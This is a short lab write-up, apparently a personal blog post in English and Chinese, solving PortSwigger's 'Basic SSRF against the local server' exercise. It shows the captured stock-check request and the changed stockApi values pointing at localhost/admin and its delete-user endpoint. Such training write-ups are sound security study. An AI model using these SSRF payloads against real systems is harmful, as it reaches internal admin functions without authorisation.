---
layout: post
title: "Basic SSRF against the local server"
description: ""
date: 2023-07-11
categories:
  - PortSwigger_Lab
  - PortSwigger_SSRF
author: ""
tags: ['PortSwigger_Lab', 'SSRF']
---





# Basic SSRF against the local server

```

This lab has a stock check feature which fetches data from an internal system.

To solve the lab, change the stock check URL to access the admin interface at `http://localhost/admin` and delete the user `carlos`.




該實驗室具有庫存檢查功能，可從內部系統獲取數據。

為解決實驗室問題，更改庫存檢查 URL 以訪問 http://localhost/admin 的管理界面並刪除用戶 carlos。


```




```http
POST /product/stock HTTP/1.1
Host: 0a9a007503a84948c09e12c800f1004b.web-security-academy.net
Cookie: session=McW8ydDlWwFi0YJmRDVfBQG9V5g5YU5v
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0
Accept: */*
Accept-Language: zh-TW,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: https://0a9a007503a84948c09e12c800f1004b.web-security-academy.net/product?productId=2
Content-Type: application/x-www-form-urlencoded
Content-Length: 107
Origin: https://0a9a007503a84948c09e12c800f1004b.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
Connection: close

stockApi=http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D2%26storeId%3D1


```


url decode 
```
stockApi=http://stock.weliketoshop.net:8080/product/stock/check?productId=2&storeId=1




```



```
stockApi=http://localhost/admin
```



往下拉可以請求到一個奇怪的介面有刪除 carlos 和 wiener 的選項;

點下去
```
Admin interface only available if logged in as an administrator, or if requested from loopback

管理界面僅在以管理員身份登錄或從環回請求時可用

```


也就是說，它可能透過refer 知道我們是從外面訪問的。


只好看它代碼。用伺服器自己去跟內網其它伺服器請求

```
<a href="/admin/delete?username=carlos">Delete</a>
```

修改
```
stockApi=http://localhost/admin/delete?username=carlos

```


成功